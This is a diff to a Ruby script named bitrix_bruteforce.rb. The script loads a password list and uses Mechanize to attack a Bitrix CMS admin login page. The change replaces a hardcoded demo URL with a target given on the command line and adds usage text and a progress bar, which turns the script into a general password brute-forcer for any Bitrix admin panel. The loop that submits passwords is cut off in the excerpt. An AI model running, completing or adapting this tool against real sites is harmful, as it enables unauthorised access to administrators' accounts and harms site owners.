@@ -1,3 +1,5 @@
+#!/usr/bin/env ruby
+
 require 'mechanize'
 require 'progress_bar'
 
@@ -7,9 +9,18 @@ File.open("./passes.txt", "r") do |f|
     passes << line.chomp.chomp
   end
 end
-agent = Mechanize.new
-agent.get("http://1554.demo.1c-bitrix.ru/bitrix/admin/?lang=en")
 
+# let's try to parse!
+begin
+  agent = Mechanize.new
+  agent.get(ARGV.first)
+rescue ArgumentError, SocketError => e
+  puts "Something wrong, use right url!"
+  puts "Usage: ./bitrix_bruteforce.rb http://example.com/path/to/admin/panel"
+  exit
+end
+
+# progress bar initialization
 bar = ProgressBar.new(passes.length)
 
 passes.each_with_index do |pass, index|
